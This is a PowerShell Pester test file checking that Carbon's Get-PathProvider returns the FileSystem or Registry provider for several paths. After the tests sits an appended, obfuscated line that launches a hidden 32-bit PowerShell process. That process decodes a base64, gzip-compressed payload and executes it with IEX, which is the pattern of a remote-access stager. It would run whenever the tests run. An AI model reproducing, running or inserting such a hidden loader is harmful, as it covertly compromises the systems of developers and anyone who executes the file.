











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'Get-PathProvider' {
    
    It 'should get file system provider' {
        ((Get-PathProvider -Path 'C:\Windows').Name) | Should Be 'FileSystem'
    }
    
    It 'should get relative path provider' {
        ((Get-PathProvider -Path '..\').Name) | Should Be 'FileSystem'
    }
    
    It 'should get registry provider' {
        ((Get-PathProvider -Path 'hklm:\software').Name) | Should Be 'Registry'
    }
    
    It 'should get relative path provider' {
        Push-Location 'hklm:\SOFTWARE\Microsoft'
        try
        {
            ((Get-PathProvider -Path '..\').Name) | Should Be 'Registry'
        }
        finally
        {
            Pop-Location
        }
    }
    
    It 'should get no provider for bad path' {
        ((Get-PathProvider -Path 'C:\I\Do\Not\Exist').Name) | Should Be 'FileSystem'
    }
    
}

Describe 'Get-PathProvider when passed a registry key PSPath' {
    It 'should return Registry' {
        Get-PathProvider -Path (Get-Item -Path 'hkcu:\software').PSPath | Select-Object -ExpandProperty 'Name' | Should Be 'Registry'
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACJRdFgCA7VWbW/aSBD+3Er9D1aFhK0SDAltmkiVbo0xdgIE4mACFJ029tpsWHsdex1eev3vNwacFyW5a086KxG7npndZ595Zsd+FrmC8khaO2fSjw/v3/VxgkNJLjGjblakEiPuWnn3DgylpXnnG/eXq1b/RPomyVMUxzoPMY1mp6fNLElIJHbzapsIlKYkvGGUpLIi/SWN5iQhBxc3t8QV0g+p9Ge1zfgNZnu3dRO7cyIdoMjLbR3u4hxU1Y4ZFXL5+/eyMj2oz6qtuwyzVC7b61SQsOoxVlakn0q+4dU6JnK5S92Ep9wX1RGNjg6rwyjFPunBavekS8Sce2lZgcPAX0JElkTS02Pl6+y85DIM+wl3keclJIWgqhXd8wWRS1HGWEX6Q57uQVxmkaAhAbsgCY9tktxTl6RVE0ceI5fEn8k9sizO/qtB8tMg8OqLRKlAWt5G2+VexshugbLyEu82owo8RVaBh58f3n947xcSCK0+e6oBGL2bbscEUMp9ntKt3zepVpG6sBEWPFnDtHSVZESZSdM8CdPZDEjdWJp2k00qb69RLwLAPdY9LdSuBLyeOpx6Mwjbp6nEwxvXzg1v600nPo2Ivo5wSN1CUvJrtBMfjr6VVuHWA2RyeW8gnk4YCbDIGaxI05dhrZCKh1gto8wjCXIhdSmggqwqz8HskiKXrahLQiBrNy9DCnwQMim89+JdF7vnc3AqNxlO04rUz6CS3IpkE8yIV5FQlNK9CWWCb4flR7jdjAnq4lQUy82UByL3GzZ5lIokcyGBcPgrOyYuxSznoiKZ1CPa2qZBsXH5VSaamDEaBbDSPWQC3uQM2CKXRQIYHySgVG0irDBmJAS/bV0bDAdQxfsi2GoJB8Qrv4BZyHun5ZyRgoonICHNNuOiIjk0EXA/5OwWgvrvOJ7cEDtEzYTsMyMXlTPV1iLXeyluBLH3pTc4znW6p2pLTCKAFCPhoYZT8qVhiwQokz+qF7SJ4BlbEeu62oLW0ZLWrS78D+mRxfVj7/zs1lQTfTX3kZVaXbOvD0yzcX9mOw1htyxx3rdEt3V9e2sj83I4FhMLmVe0thg3NvEZ3dgd5I1X6peNtlnWtNXmNvD8se77wbFvX9Y/G7Qzag602iHu6K2sM9KWWq2RtujSHNDhYHFmiJuxw/DQV4Pr+gmmq05y69R5d2Mh1J4fuZsz32nPu956bKono8YCtRBqRi3H0Pj5WEtQX3Vw4PDl+fwTHQVw1vYxJZPB0NAGA0NDw/btnX6iBhB7jefayDmkk/j6cg5zAyCcq7WG5ZENHw+ApDZHOLgEn6B56M598NE/Ie1Tj6eHeKFxpIGPMbkDXOPY6DOwXw0POXJY7xqjzmRtqGp93G8gs0ZH7QDlS+JAG2CU3usbXa07HvdGn3tjX3Wu2bGqN69i11dVdWnq5+6kvvp6cfy1M6JOyNFQVZ2PuTpAHqWw26DN9NpcWdnJk7y/dbV3cZLOMQM9wGVdVKbBE2N//fY5zSNkOe/EC5JEhEEDgxZX6Boxxt28CWzvaWhAu7Ywg+ocwvDo8NWRIj04Ko9doXh1ejoBkHnBFAqudkgUiHmltjqq1eCer60aNTjxr5+uyeO1/LheJW8Wz7h6thvb7qbk1VRKKF1w63+lcl/Ec/jx/o3Kx3f/YP0lemuV5wS8MD9/8Vt0/y4DI0wFONpwDzGy646vE7GXz5MviV1+QBn+/sm/7C4ycdCDT4y/AR4QeKVJCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

